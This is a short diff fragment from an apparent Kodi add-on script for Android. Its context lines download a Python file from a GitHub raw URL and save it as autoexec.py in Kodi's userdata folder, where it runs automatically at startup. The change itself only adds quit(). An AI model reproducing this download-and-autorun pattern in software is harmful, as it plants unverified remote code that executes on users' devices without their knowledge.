@@ -86,3 +86,5 @@ if os.path.isfile(PATH0) and os.access(PATH0, os.R_OK):
 else:
     fullfilename = os.path.join('/sdcard/Android/data/org.xbmc.kodi/files/.kodi/userdata/', 'autoexec.py')
     urllib.urlretrieve("https://raw.githubusercontent.com/pedrojuanamelie/universidadpal/master/test.py", fullfilename)
+	
+quit()
